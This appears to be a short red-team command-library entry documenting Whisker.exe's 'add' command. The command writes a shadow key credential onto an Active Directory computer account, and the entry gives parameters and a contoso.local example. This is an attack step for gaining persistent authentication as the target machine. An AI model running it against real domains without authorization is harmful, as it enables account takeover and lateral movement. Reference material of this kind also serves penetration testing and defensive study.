---
id: f37bdc20-504e-4e26-9caf-d8bfe583837b
name: whisker-add-key-credential-computername
type: command
executor: cmd
data: >-
  Whisker.exe add /target:$_TARGET_COMPUTER$ /domain:$_DOMAIN /dc:$_DC
  /path:$_PFX_PATH /password:$_PFX_PASSWORD
output: null
created_at: '2023-04-06T03:56:06.261395+00:00'
updated_at: '2023-04-10T20:26:09.591812+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - key-credentials
verified: true
validated: true
---

# whisker-add-key-credential-computername

## Command

```cmd
Whisker.exe add /target:$_TARGET_COMPUTER$ /domain:$_DOMAIN /dc:$_DC /path:$_PFX_PATH /password:$_PFX_PASSWORD
```

## Description

Adds a key credential to a computer object using its machine account name. Variant for computer targets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /target:$_TARGET_COMPUTER$ | Target computer SAM (e.g., computername$) | Yes |
| /domain:$_DOMAIN | Domain name | No (auto-detect) |
| /dc:$_DC | Domain controller | No |
| /path:$_PFX_PATH | PFX file path | Yes |
| /password:$_PFX_PASSWORD | PFX password | Yes |

## Examples

### Basic Usage

```cmd
Whisker.exe add /target:workstation$ /domain:contoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1
```

## Expected Output

Confirmation of addition. Verify with list command.

## Related

- [[procedures/Shadow-Credentials-for-Windows-Hello]]
- [[tools/Whisker]]
